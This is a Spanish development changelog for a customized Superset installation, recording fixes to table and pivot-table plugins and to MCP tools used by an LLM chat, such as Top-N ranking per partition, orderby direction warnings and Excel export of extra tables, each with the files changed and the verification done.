- `npx jest --runInBand plugins/plugin-chart-tableV3/test/controlPanel.test.ts`
- `npm run build-dev`

### 2026-03-25

Cambio realizado:
Ajuste visual adicional de los subtotales en `plugin-chart-tableV3` para devolver el recuadro a la etiqueta `Subtotal` y resaltar los valores con negrita y borde inferior del color del tema.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/src/Styles.tsx`

Que cambia o corrige:
- La palabra `Subtotal` vuelve a mostrarse como badge con recuadro dentro del encabezado del grupo.
- Los importes de subtotal siguen sin caja completa, pero ahora quedan en negrita y con un borde inferior del color del tema para destacarlos.
- El ajuste mantiene intacta la logica de agrupacion y solo modifica la presentacion visual.

Verificacion:
- `npm run build-dev`

### 2026-03-25

Cambio realizado:
Correccion adicional del subtotal agrupado en `plugin-chart-tableV3` para evitar que el nombre del grupo y los montos se monten visualmente entre si.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/src/Styles.tsx`

Que cambia o corrige:
- El contenedor del nombre del subtotal ahora recorta correctamente el texto largo con `ellipsis` dentro de la celda del grupo.
- Las celdas de montos de subtotal ahora recortan su contenido horizontalmente para que no invada la columna del nombre.
- El wrapper HTML de subtotal tambien queda limitado al ancho de su celda, evitando que badges o spans internos se desborden sobre columnas vecinas.

Verificacion:
- `npm run build-dev`

### 2026-03-25

Cambio realizado:
Refuerzo de negrita en subtotales y resumen HTML de `plugin-chart-tableV3` mediante inyeccion inline sobre el markup renderizado, para que el enfasis no dependa solo del CSS.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/src/TableChart.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/test/TableChart.test.tsx`

Que cambia o corrige:
- Los subtotales y el resumen que vienen como HTML ahora reciben `font-weight: 700 !important` directamente dentro del markup renderizado.
- Si la plantilla HTML trae estilos propios, el subtotal/resumen sigue forzando la negrita sobre los elementos renderizados.
- Se agrego una regresion para cubrir el caso de subtotales agrupados con HTML y `font-weight` previo menor.

Verificacion:
- `npm run build-dev`
- `npx jest --runInBand plugins/plugin-chart-tableV3/test/TableChart.test.tsx -t "forces bold font weight inside HTML subtotal values"` bloqueado por un problema preexistente del workspace: `Cannot find module 'cheerio/lib/utils'` desde `enzyme`

### 2026-03-25

Cambio realizado:
Ajuste visual final de subtotales en `plugin-chart-tableV3` para resaltarlos mas sin usar recuadro ni negrita.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/src/Styles.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/src/TableChart.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/test/TableChart.test.tsx`

Que cambia o corrige:
- Se retiro el intento de forzar `font-weight` inline dentro del HTML de subtotal/resumen.
- Los subtotales ahora destacan por una linea inferior mas fuerte con el color principal del tema, un tamano de fuente apenas mayor y un leve espaciado entre caracteres.
- El ajuste mantiene intactos los colores semanticos rojo/verde y evita usar caja completa o negrita.
- La regresion de `TableChart` se actualizo para validar que los subtotales HTML sigan renderizando dentro del wrapper correcto.

Verificacion:
- `npm run build-dev`
- `npx jest --runInBand plugins/plugin-chart-tableV3/test/TableChart.test.tsx -t "renders HTML subtotal values inside the summary wrapper"` bloqueado por un problema preexistente del workspace: `Cannot find module 'cheerio/lib/utils'` desde `enzyme`

### 2026-03-25

Cambio realizado:
Correccion visual para que la fila de subtotal agrupado no quede transparente cuando se activan columnas fijas en `plugin-chart-tableV3`.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/src/TableChart.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/src/Styles.tsx`

Que cambia o corrige:
- Las celdas sticky de la fila de subtotal agrupado ahora reciben un fondo solido igual al de la propia fila agrupada.
- Se evita que el contenido de otras columnas se traslape visualmente por detras al desplazar horizontalmente con `sticky columns`.
- El ajuste se aplica tanto en el estilo inline de la celda sticky como en una regla CSS especifica para las filas `dt-group-header-row`.

Verificacion:
- `npm run build-dev`

### 2026-03-25

Cambio realizado:
Ajuste visual para que los subtotales y resumen con formato HTML en `plugin-chart-tableV3` respeten la negrita aunque el contenido se renderice con `dangerouslySetInnerHTML`.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/src/Styles.tsx`

Que cambia o corrige:
- El wrapper `.dt-group-row-summary-html` ahora fuerza `font-weight` fuerte para los valores de subtotal/resumen renderizados como HTML.
- Los nodos hijos del HTML tambien heredan la negrita, evitando que spans internos con color rojo/verde pierdan el enfasis visual.
- Se conserva el color y el resto del formato HTML; solo se refuerza el peso tipografico.

Verificacion:
- `npm run build-dev`

### 2026-03-25

Cambio realizado:
Ajuste visual de los subtotales en `plugin-chart-tableV3` para que ya no se muestren dentro de recuadros y los valores queden resaltados en negrita.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/src/Styles.tsx`

Que cambia o corrige:
- Los valores numericos de subtotal en filas agrupadas ya no renderizan con borde, fondo ni efecto de caja.
- La etiqueta `Subtotal` del encabezado de grupo tambien deja de mostrarse como badge con recuadro y pasa a verse como texto simple.
- Se mantiene el enfasis visual de los importes de subtotal usando negrita.

Verificacion:
- `npm run build-dev`

### 2026-03-25

Cambio realizado:
Correccion adicional para que `Column order` de `plugin-chart-tableV3` no siga mostrando columnas fantasma del dataset cuando el `column_order` guardado ya venia contaminado con valores viejos.

Archivos afectados:
- `superset_v6/superset-frontend/src/explore/components/controls/MetricOrderControl/index.tsx`
- `superset_v6/superset-frontend/src/explore/components/controls/MetricOrderControl/MetricOrderControl.test.tsx`

Que cambia o corrige:
- `MetricOrderControl` ahora cruza el valor actual de `column_order` contra las opciones validas generadas por el plugin y elimina cualquier campo guardado que ya no exista en la tabla.
- Esto corrige el caso donde `Column order` seguia mostrando todas las columnas del dataset aunque `controlPanel.tsx` ya solo estuviera entregando los campos visibles.
- El control mantiene el orden real de columnas validas y solo agrega las faltantes que sigan siendo parte de la tabla actual.
- Se agrego una regresion para cubrir especificamente la limpieza de columnas fantasma persistidas en configuraciones viejas.

Verificacion:
- `npx jest --runInBand src/explore/components/controls/MetricOrderControl/MetricOrderControl.test.tsx`
- `npx jest --runInBand plugins/plugin-chart-tableV3/test/controlPanel.test.ts`
- `npm run build-dev`

### 2026-05-07

Cambio realizado:
Nuevas opciones tipo Matrix de Power BI para filas en `plugin-chart-pivot-tableRx1`.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/plugin/controlPanel.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/plugin/transformProps.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/PivotTableChart.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/react-pivottable/TableRenderers.jsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/types.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/test/plugin/transformProps.test.ts`

Que cambia o corrige:
- Se agregan controles `Collapse rows by default` y `Compact row tree`, visibles cuando `Show rows subtotal` esta activo.
- `Collapse rows by default` inicia los grupos de filas colapsados, manteniendo la capacidad de expandir con las flechas.
- `Compact row tree` muestra los campos de fila en una sola columna con indentacion tipo arbol.
- Se ajusta el test de `transformProps` para cubrir las nuevas opciones y aceptar los campos actuales extra de Rx1.

Verificacion:
- `node -e "... @babel/parser ... TableRenderers.jsx ..."` parse OK.
- `git diff --check`
- `npm test -- --runTestsByPath plugins/plugin-chart-pivot-tableRx1/test/plugin/transformProps.test.ts plugins/plugin-chart-pivot-tableRx1/test/plugin/buildQuery.test.ts plugins/plugin-chart-pivot-tableRx1/test/index.test.ts`

### 2026-05-07

Cambio realizado:
Correccion del ordenamiento interactivo de Pivot Table Rx1 para columnas de `Formula metrics (Jinja-like)`.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/react-pivottable/TableRenderers.jsx`

Que cambia o corrige:
- El sorting de columnas ahora usa el valor evaluado por `getFormulaValue` cuando la columna/fila corresponde a una formula metric.
- Antes el sorting tomaba el valor agregado base de `pivotData`, que para filas de formula era `0`, por eso no cambiaba el orden.

Verificacion:
- `node -e "... @babel/parser ... TableRenderers.jsx ..."` parse OK.
- `git diff --check`
- `npm test -- --runTestsByPath packages/superset-ui-core/test/time-format/TimeFormatter.test.ts`

### 2026-05-07

Cambio realizado:
Port parcial de mejoras recientes de Pivot Table a `plugin-chart-pivot-tableRx1`.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/react-pivottable/TableRenderers.jsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/package.json`
- `superset_v6/superset-frontend/package-lock.json`
- `superset_v6/superset-frontend/packages/superset-ui-core/src/time-format/TimeFormatter.ts`
- `superset_v6/superset-frontend/packages/superset-ui-core/src/time-format/utils/stringifyTimeInput.ts`
- `superset_v6/superset-frontend/packages/superset-ui-core/test/time-format/TimeFormatter.test.ts`

Que cambia o corrige:
- Se agrega ordenamiento interactivo en columnas de Pivot Table Rx1 basado en el PR upstream #36050.
- Se agrega soporte de formato condicional sobre headers de filas/columnas cuando las reglas aplican a valores string, compatible con la estructura custom de Rx1.
- Se corrige el formateo de fechas cuando Pivot Table recibe timestamps como string numerico, evitando encabezados `NaN`.
- Se agrega `@react-icons/all-files` como peer dependency del plugin Rx1 para los iconos de ordenamiento.
- Se agregan pruebas de `TimeFormatter` para string numerico e ISO date string.

Verificacion:
- `node -e "... @babel/parser ... TableRenderers.jsx ..."` parse OK.
- `git diff --check`
- `npm test -- --runTestsByPath packages/superset-ui-core/test/time-format/TimeFormatter.test.ts`
- `npm test -- --runTestsByPath plugins/plugin-chart-pivot-tableRx1/test/plugin/transformProps.test.ts plugins/plugin-chart-pivot-tableRx1/test/plugin/buildQuery.test.ts plugins/plugin-chart-pivot-tableRx1/test/index.test.ts` falla solo en `transformProps.test.ts` por expectativa desactualizada que no contempla campos ya devueltos por Rx1.

### 2026-03-25

Cambio realizado:
Correccion para que el orden definido en `Column order` de `plugin-chart-tableV3` no se pierda al guardar el chart, tanto para columnas normales como calculadas.

Archivos afectados:
- `superset_v6/superset-frontend/src/explore/components/controls/MetricOrderControl/index.tsx`
- `superset_v6/superset-frontend/src/explore/components/controls/MetricOrderControl/MetricOrderControl.test.tsx`
- `superset_v6/superset-frontend/src/explore/actions/saveModalActions.test.ts`

Que cambia o corrige:
- `MetricOrderControl` ya no descarta valores actuales de `column_order` cuando `options` llega temporalmente incompleto durante rerenders del panel.
- Esto evita que el control “autolimpie” el orden guardado y termine perdiendo métricas, columnas normales o `Calculated columns` antes de persistir el chart.
- El mapa de labels sigue usando el label visible de `options` cuando existe y solo usa el valor crudo como fallback cuando todavia no hay metadata suficiente.
- Se agrego una regresion del control para cubrir el caso donde el valor actual contiene columnas que todavia no aparecen en `options`.
- Se agrego una prueba del save flow para validar que `column_order` quede incluido en `params` al guardar.

Verificacion:
- `npx jest --runInBand src/explore/components/controls/MetricOrderControl/MetricOrderControl.test.tsx`
- `npx jest --runInBand src/explore/actions/saveModalActions.test.ts -t "column_order"`
- `npm run build-dev`

### 2026-03-25

Cambio realizado:
Correccion para que `Column order` de `plugin-chart-tableV3` solo muestre campos que realmente pueden verse en la tabla.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/src/controlPanel.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-tableV3/test/controlPanel.test.ts`

Que cambia o corrige:
- `Column order` ya no usa como fallback todas las columnas del dataset cuando falta o cambia el `queryResponse`.
- Ahora la lista se construye a partir de los campos realmente visibles del chart: `groupby` o `all_columns`, `metrics`, `percent_metrics` y `Calculated columns`.
- El `queryResponse` solo se usa para respetar el orden/tipo real cuando existe, pero no para introducir campos auxiliares o columnas que no forman parte de la tabla visible.
- Se mantiene la exclusion de `Jinja Fields` y tambien se filtran columnas auxiliares presentes en el response pero no seleccionadas para mostrarse.
- Se agregaron regresiones para cubrir tres casos: exclusion de `Jinja Fields`, exclusion de campos extra del query y fallback correcto cuando no hay `queryResponse`.

Verificacion:
- `npx jest --runInBand plugins/plugin-chart-tableV3/test/controlPanel.test.ts`
- `npm run build-dev`

### 2026-06-19

### 2026-07-17

Cambio realizado:
Se agregó cache temporal en memoria para análisis de `irex.compare_periods` y soporte de `report_id` en `irex.export_to_excel`, además de mejoras puntuales de comparación y alias de métricas fórmula.

Archivos afectados:
- `superset_v6_1_0/irex-mcp-tools/backend/src/irex/irex_mcp_tools/report_cache.py`
- `superset_v6_1_0/irex-mcp-tools/backend/src/irex/irex_mcp_tools/compare_periods.py`
- `superset_v6_1_0/irex-mcp-tools/backend/src/irex/irex_mcp_tools/export_excel.py`
- `superset_v6_1_0/irex-mcp-tools/backend/src/irex/irex_mcp_tools/query_dataset.py`

Que cambia o corrige:
- Nuevo helper `report_cache.py` con store en memoria por usuario, TTL 2 horas, limpieza perezosa y detección de llamadas recientes con filtros A/B invertidos.
- `irex.compare_periods` ahora valida que `aggregate_by` sea subconjunto estricto de `groupby`, puede calcular `totals`, reclasifica filtros de dashboard a `jinja_filters`, advierte repeticiones invertidas y devuelve `report_id`.
- `irex.export_to_excel` acepta `report_id`, recupera los parámetros guardados del análisis y exporta exactamente esa comparación sin reconstruir filtros manualmente.
- `_parse_metric` genera alias automáticos legibles para métricas fórmula sin alias explícito y sanea alias explícitos corruptos.

Verificacion:
- `python3 -m py_compile` ejecutado correctamente sobre `report_cache.py`, `compare_periods.py`, `export_excel.py` y `query_dataset.py`.

Cambio realizado:
`get_dashboard_info` (MCP) no exponía el campo `description` de los filtros nativos del dashboard, aunque Superset sí lo soporta al crear/editar un filtro.

Archivos afectados:
- `superset_v6_1_0/superset/mcp_service/dashboard/schemas.py`

Que cambia o corrige:
- Se agregó el campo `description` a `NativeFilterSummary`.
- `_extract_native_filters` ahora extrae `f.get("description")` del JSON de configuración del filtro.
- Esto permite que el LLM (vía chat) lea la descripción que el dueño del dashboard configuró en cada filtro nativo, ej. para documentar el significado de códigos de la columna `medida` (Cjs=Cajas, Col=Colones, etc.) — evita que el LLM tenga que adivinar/probar valores por ensayo y error. El significado de los códigos puede variar por dashboard, por eso se resuelve a nivel de descripción del filtro y no con un glosario fijo en código.
- Cambio en archivo compartido por ambos entornos (prod y test usan el mismo `superset_v6_1_0/`), requiere reiniciar `superset_mcp` y `superset_mcp_test` para tomar efecto.

Verificacion:
- Probado contra dashboard 54 y 57 en test: el campo `description` ya aparece en la respuesta de `get_dashboard_info` (vacío en los filtros que aún no tienen descripción escrita, como se espera).

### 2026-07-03

Cambio realizado:
`Calculated columns (Jinja-like)` de `plugin-chart-tableV3` (y `Formula metrics (Jinja-like)` de `plugin-chart-pivot-tableRx1`) desaparecían del gráfico al editar el dataset desde Explore, incluso si el cambio no tocaba ninguna columna usada en las fórmulas.

Archivos afectados:
- `custom-plugins/plugin-chart-tableV3/src/controlPanel.tsx`
- `custom-plugins/plugin-chart-pivot-tableRx1/src/plugin/controlPanel.tsx`
- `custom-src/FormulaMetricControl/index.tsx`
- `superset_v6_1_0/superset-frontend/src/explore/reducers/exploreReducer.ts` (parche in-place, no symlink)
- `superset_v6_1_0/superset-frontend/src/explore/reducers/exploreReducer.test.ts`
- `migrate-plugins.sh` (nuevo paso 15)
- `PLUGINS.md`

Que cambia o corrige:
- Causa raíz: el `mapStateToProps` de los controles `calculated_columns` (tableV3) y `metricFormulas` (pivot-tableRx1) devolvía una prop llamada `columns` (usada solo para el autocompletado del editor de fórmulas). `exploreReducer`'s `UPDATE_FORM_DATA_BY_DATASOURCE` (se dispara al guardar una edición del dataset desde `DatasourceControl`, sin importar si el `id` del dataset cambió) trata cualquier control cuyo estado tenga una key `columns` como control de selección de columnas y revalida su valor contra el datasource vía `getControlValuesCompatibleWithDatasource`. Como los items de estos controles (`{key, label, expression, d3format}`) nunca calzan con la forma de una columna/métrica/filtro real, `isControlValueCompatibleWithDatasource` devuelve `false` para todos y el control completo colapsa a su `default: []` — vaciando las fórmulas sin relación con lo editado en el dataset.
- Fix: se renombró la prop a `datasourceColumns` en ambos `controlPanel.tsx` y en `FormulaMetricControl` (prop, propTypes, defaultProps y uso en `getKeywords()`), evitando la colisión con el heurístico del reducer.
- Adicional (bug relacionado, no el reportado pero descubierto en el mismo código): `exploreReducer.ts` de v6.1.0 nunca recibió la lógica que existía en `superset_v6/.../exploreReducer.js` para sincronizar `column_config` y `column_order` cuando se renombra el `label` de una calculated column — se restauró (adaptada a TypeScript) para que el "Customize columns" y el orden guardado no se pierdan al renombrar.

Verificacion:
- Lectura de `getControlState.ts` (`applyMapStateToPropsToControl`) confirmando que el objeto de `mapStateToProps` se aplica con spread directo sobre el `controlState`, y de `getControlValuesCompatibleWithDatasource.ts` confirmando que ningún branch reconoce la forma `{key, label, expression}` → confirma la causa raíz sin necesidad de reproducir en browser.
- `node -e "... @babel/parser ..."` parse OK sobre los 5 archivos TS/TSX modificados.
- Se extrajo el bloque Python del paso 15 de `migrate-plugins.sh` y se corrió standalone contra una copia limpia (`git show HEAD:...exploreReducer.ts`) de v6.1.0 — el resultado es byte-a-byte idéntico al parche aplicado a mano, confirmando que el script reproduce el fix correctamente para futuras migraciones.
- No se pudo correr `npx jest` sobre `exploreReducer.test.ts` — falla preexistente y no relacionada: Jest no resuelve el symlink de `custom-src/ListViewCard/index.tsx` con la misma lógica que `resolve.symlinks: false` de webpack, y sus imports relativos (`../Skeleton`) rompen la resolución de módulos ni bien algo importa `exploreReducer.ts`. Se confirmó que la falla ya existía antes de este cambio (mismo error con `git stash` del archivo).
- Pendiente: `npm run build` del frontend y prueba manual en Explore (editar un dataset con calculated columns ya definidas y confirmar que sobreviven).

### 2026-07-24

Cambio realizado:
Mejoras de confiabilidad en los análisis de brechas y rankings Top-N por grupo del MCP irex, a raíz de la sesión `58ead3f6-6564-4670-b8f2-c2fd101ac47f` del chat: un desglose por área usó SQL libre con `plan - proyeccion` sin COALESCE sobre una fuente truncada en `fetch_row_limit=5000`, haciendo desaparecer combinaciones presentes en una sola métrica (ej. omitió una caída de -844,032 kg en SELECTO-LAVAP. CREMA) y presentando totales/rankings incompletos como exactos.

Archivos afectados:
- `superset_v6_1_0/irex-mcp-tools/backend/src/irex/irex_mcp_tools/rank_partitions.py` (nuevo — tool `irex.rank_partitions`)
- `superset_v6_1_0/irex-mcp-tools/backend/src/irex/irex_mcp_tools/partition_ranking_core.py` (nuevo — núcleo de cálculo sin imports de Superset, testeable standalone)
- `superset_v6_1_0/irex-mcp-tools/backend/src/irex/irex_mcp_tools/sql_analysis.py` (campos `result_exact`/`incomplete_reason` + reglas de SQL correcto en la descripción)
- `superset_v6_1_0/irex-mcp-tools/backend/src/irex/irex_mcp_tools/entrypoint.py` (registro del módulo nuevo)
- `superset_v6_1_0/irex-mcp-tools/backend/tests/test_partition_ranking_core.py` (nuevo — 18 tests sintéticos)
- `/home/imercados/.superset/superset_config.py` (paso 6: `irex.rank_partitions` en `always_visible`)
- `extensions/irex-mcp-tools-0.1.0.supx` + copia sincronizada en `superset_v6_1_0/irex-mcp-tools/`

Que cambia o corrige:
- Nueva tool `irex.rank_partitions` (aditiva, no cambia contratos existentes): ranking Top-N POR PARTICIÓN de la brecha entre dos métricas, con semántica fija que el LLM no puede degradar: (1) preagregación obligatoria en Superset (metrics + partition_by + detail_by, respetando RLS — reutiliza `_fetch_source_rows`); (2) brecha SIEMPRE `COALESCE(a,0)-COALESCE(b,0)` — combinaciones presentes en una sola métrica valen +A o -B y nunca desaparecen por NULL; (3) `ROW_NUMBER() OVER (PARTITION BY ...)` con desempate determinístico — el top_n se aplica dentro de cada partición; (4) `partition_totals` calculados sobre el universo completo antes del top_n, con `top_n_delta_sum`/`remaining_delta` para explicitar lo que queda fuera; (5) `reconciliation` que verifica detalle vs `metric_a_total - metric_b_total`; (6) `null_diagnostics` (filas solo-en-A, solo-en-B, ambas nulas); (7) compuerta de truncamiento: si la fuente alcanza `fetch_row_limit`, devuelve `status="incomplete"` sin ranking (default `require_complete_source=true`; con false devuelve marcado `result_exact=false`).
- Se eligió tool dedicada (y no un input estructurado dentro de `query_dataset_sql`) por enrutamiento: para un LLM la señal más fuerte es la elección de tool por nombre/descripción; un parámetro opcional anidado no lo desvía del SQL libre. Además evita un contrato con `sql` condicionalmente requerido.
- `irex.query_dataset_sql` (retrocompatible): la respuesta ahora incluye `result_exact` (true/false) de primer nivel e `incomplete_reason="source_truncated"` cuando cualquier fuente (data o extra_tables) quedó truncada — `status` sigue siendo "success" para no romper llamadas existentes. La descripción suma reglas de SQL correcto (COALESCE en brechas, QUALIFY para top-N por grupo, y puntero a `irex.rank_partitions`).
- Fase 2 (pendiente, solo si se valida la necesidad): `contribution_pct`, modos `variation_pct` de rank_by, heurísticas sobre SQL libre.

Verificacion:
- 18/18 tests sintéticos pasan (`.venv/bin/python -m pytest backend/tests/ -q`), incluido el caso base de la propuesta: plan/proy 130/170, delta_total -40, Top-2 por abs_delta = Y(-50) y Z(+30), total de partición intacto en -40 con top_n=2 (`top_n_delta_sum=-20`, `remaining_delta=-20`); más: varias particiones, empate determinístico, denominador cero (variation_pct=None), ambas métricas nulas, top_n > filas, partición global, nombres con espacios/paréntesis, validaciones de columnas/tipos.
- `py_compile` OK sobre los 4 módulos tocados; paths dentro del ZIP verificados (`backend/src/...`); ambos `.supx` con el mismo md5.
- Los flujos de fetch/RLS/jinja_filters/truncamiento reutilizan `_fetch_source_rows` ya probado en producción — no se duplicó motor DuckDB ni lógica de filtros.
- Pendiente al momento de escribir: reinicio de `superset_mcp.service` (requiere sudo) y verificación en journalctl + prueba end-to-end desde el chat.

### 2026-07-24 (segunda entrega — naming de columnas en irex.rank_partitions)

Cambio realizado:
Feedback de la sesión `619d22e4-cd96-4878-9e22-8bc189ac85df` (primer uso end-to-end exitoso de `irex.rank_partitions` tras el fix del validador del chat): la tabla renderizada mostraba columnas genéricas `metric_a`/`metric_b`/`metric_a_total`/`metric_b_total`, ilegibles para el usuario final — no se sabe qué métrica es cuál sin mirar el bloque `ranking`, que el widget no muestra.

Archivos afectados:
- `superset_v6_1_0/irex-mcp-tools/backend/src/irex/irex_mcp_tools/partition_ranking_core.py`
- `superset_v6_1_0/irex-mcp-tools/backend/src/irex/irex_mcp_tools/rank_partitions.py` (solo descripción)
- `superset_v6_1_0/irex-mcp-tools/backend/tests/test_partition_ranking_core.py` (+6 tests, total 24)
- `extensions/irex-mcp-tools-0.1.0.supx` + copia sincronizada

Que cambia o corrige:
- CAMBIO DE CONTRATO (la tool tiene <1 día, único consumidor avisado): en `rows`, las dos métricas ahora salen como columnas con su ALIAS REAL (ej. `plan_2027`, `proy_cierre_2026`) en vez de `metric_a`/`metric_b`; en `partition_totals`, los totales se llaman `<alias>_total` (ej. `plan_2027_total`) en vez de `metric_a_total`/`metric_b_total`. `delta`, `abs_delta`, `rank`, `delta_total`, `variation_pct`, `detail_row_count`, `top_n_*` y `remaining_delta` no cambian. `reconciliation.details` también usa los alias reales; `null_diagnostics` mantiene claves genéricas (es un bloque diagnóstico y el bloque `ranking` mapea a/b → alias).
- Internamente el SQL usa prefijo `__pr_` para evitar colisiones; nueva validación: dimensiones y aliases no pueden llamarse `delta`/`abs_delta`/`rank` ni empezar con `__pr_` (error accionable sugiriendo otro alias).

Verificacion:
- 24/24 tests pasan, incluyendo nuevos: rows con alias reales (y ausencia de claves genéricas), totales con alias de caracteres especiales (`SUM(plan)_total`), rechazo de nombres reservados.
- `py_compile` OK; paths del ZIP verificados; ambos `.supx` con mismo md5.
- Pendiente: reinicio de `superset_mcp.service` (sudo) y re-prueba desde el chat.

### 2026-07-29

Cambio realizado:
Salvaguardas de ordenamiento en `irex.query_dataset` (y `irex.export_to_excel`), a raíz de la sesión `32bf35fa-3524-47b9-8181-cbea055f20b9`: el LLM del chat pidió un desglose de brechas con `orderby` SIN marcador de dirección (= ascendente) y `row_limit=10`, por lo que el cliente con la brecha positiva más alta (EL CRISTO) quedó cortado por el límite y el usuario final lo detectó. El MCP devolvió lo que se le pidió (incluidos `truncated:true` y el warning genérico, que el modelo ignoró) — el fix apunta a que la dirección sea visible y el warning nombre exactamente qué quedó fuera.

Archivos afectados:
- `superset_v6_1_0/irex-mcp-tools/backend/src/irex/irex_mcp_tools/query_dataset.py`
- `superset_v6_1_0/irex-mcp-tools/backend/src/irex/irex_mcp_tools/export_excel.py` (pasa metrics a `_parse_orderby` para resolución de alias)
- `superset_v6_1_0/irex-mcp-tools/backend/tests/test_orderby_parsing.py` (nuevo — 12 tests con stub de superset_core)
- `extensions/irex-mcp-tools-0.1.0.supx` + copia sincronizada

Que cambia o corrige (todo aditivo/retrocompatible):
- `_parse_orderby` acepta sufijo ' DESC'/' ASC' estilo SQL (lo que un LLM escribe naturalmente) además del prefijo '-'; y resuelve el ALIAS de una métrica ya definida en `metrics` (ej. orderby:['Brecha DESC'] con metrics:['SUM(a)-SUM(b) AS "Brecha"']) — antes un alias suelto se mandaba a Superset como métrica guardada y fallaba. Alias citado ('"Brecha"') también soportado.
- Respuesta de `query_dataset` suma: `ordered_by` (eco de [{by, direction}] aplicado), `result_exact` (consistente con query_dataset_sql/rank_partitions).
- Cuando el resultado trunca Y hay orderby, el warning ahora nombra el extremo que quedó fuera: "el orden es ASCENDENTE por 'Brecha' → los valores más ALTOS de 'Brecha' quedaron FUERA", con instrucción de invertir la dirección. Es la combinación que produjo la omisión de EL CRISTO.
- Descripción del campo `orderby` reescrita con la regla crítica orden+límite.
- NO se implementó la "validación de ambigüedad expr-vs-alias en AS" propuesta por el agente del chat: ordenar por la expresión o por su alias produce el mismo orden — no hay ambigüedad semántica.

Verificacion:
- 36/36 tests pasan (12 nuevos de orderby: prefijo '-', sufijos DESC/ASC, alias con/sin comillas, alias desconocido pasa como métrica guardada, eco de dirección, y el caso literal de la sesión 32bf35fa).
- `py_compile` OK; paths del ZIP verificados; ambos `.supx` con mismo md5.
- Pendiente: reinicio de `superset_mcp.service` (sudo) y re-prueba desde el chat.

### 2026-07-29 (chat legacy vs chat MCP)

Cambio realizado:
El chat legacy ("Consúltele al don" — botón flotante #chatButton + ventana #chatWindow) y el widget del chat MCP se mostraban simultáneamente para los usuarios con acceso al chat nuevo. Ahora el legacy se oculta por completo cuando el chat MCP se muestra; los usuarios SIN el rol del chat MCP (CHAT_WIDGET_REQUIRED_ROLE) siguen viendo el legacy sin cambios. Decisión confirmada con el usuario: se oculta TODO el botón flotante, incluyendo las pestañas Marcadores y Estados PNC que viven dentro de esa ventana.

Archivos afectados:
- `custom-src/login/mcp_widget.py` (symlink activo en `superset_v6_1_0/superset/security/mcp_widget.py`)
- `superset_v6_1_0/superset/static/js_personal/chat.js` (v7.1.2)
- `superset_v6_1_0/superset/templates/tail_js_custom_extra.html` (bump de versión para bustear caché)

Que cambia o corrige:
- `inject_chat_widget` (el after_request que inyecta el widget MCP, y que SOLO corre para usuarios autenticados con `_user_has_chat_access()`) ahora agrega al <style> inyectado: `#chatButton,#chatWindow{display:none !important;}` — el gating por permiso es el mismo que decide si el chat MCP se muestra, no hay lógica nueva de roles.
- El mismo inline script marca `window.__MCP_CHAT_ACTIVE__ = true` durante el parseo del body (antes de DOMContentLoaded, sin carrera posible).
- `chat.js` hace early-return si ese flag está presente — sin esto, aunque oculto, el auto-click de la primera pestaña cargaba el iframe del bot viejo (botframework) en background.

Verificacion:
- `py_compile` OK sobre mcp_widget.py; `node --check` OK sobre chat.js.
- El pyc de `custom-src/login/__pycache__` se regenera solo — no requiere acción.
- Requiere reiniciar `superset.service` (no el MCP) para tomar el cambio de mcp_widget.py; el bump v7.1.2 fuerza el refetch de chat.js en los navegadores.
- Prueba manual pendiente: (1) usuario CON rol → no debe verse el botón "El Don" y el widget MCP sí; (2) usuario SIN rol → el botón "El Don" debe seguir funcionando con sus 3 pestañas.

### 2026-07-29 (extra_tables en export_to_excel)

Cambio realizado:
Sesión `470f2e8d-009e-4685-bec0-8281c06665ba`: un Pareto multi-granularidad validado en `irex.query_dataset_sql` con `extra_tables` (data + data2, dataset 62) falló al exportarse con `irex.export_to_excel` usando el mismo request: "Table with name data2 does not exist". Causa: el modo SQL de export llamaba a `execute_sql_analysis` sin pasar `extra_tables`, y como `ExportToExcelRequest` no tenía ese campo, Pydantic ignoraba el input en silencio — la tool aparentaba aceptar el parámetro pero nunca materializaba las tablas extra.

Archivos afectados:
- `superset_v6_1_0/irex-mcp-tools/backend/src/irex/irex_mcp_tools/export_excel.py`
- `superset_v6_1_0/irex-mcp-tools/backend/tests/test_sql_analysis_extra_tables.py` (nuevo — 7 tests, fetch mockeado)
- `extensions/irex-mcp-tools-0.1.0.supx` + copia sincronizada

Que cambia o corrige (aditivo):
- `ExportToExcelRequest` suma `extra_tables` (mismo modelo `ExtraTable` de sql_analysis) y lo pasa al motor compartido `execute_sql_analysis` — mismas garantías por fuente que en query_dataset_sql: metrics/groupby/filters/jinja_filters/fetch_row_limit propios y RLS. La paridad es estructural: es la MISMA función, no una reimplementación.
- `extra_tables` sin `sql` → error explícito inmediato (antes: ignorado en silencio).
- La respuesta del export ahora propaga los diagnósticos del modo SQL: `result_exact`, `source_row_count`, `source_truncated`, `source_truncated_warning`, `incomplete_reason`, `extra_sources`.
- Si alguna fuente quedó truncada, el caveat se inserta ADEMÁS como sección "⚠️ Datos posiblemente incompletos" al inicio de la hoja Resumen del Excel (creándola si no había summary_text) — el archivo circula fuera del chat y debe ser autocontenido; y el `message` de la respuesta instruye a no presentarlo como exacto.
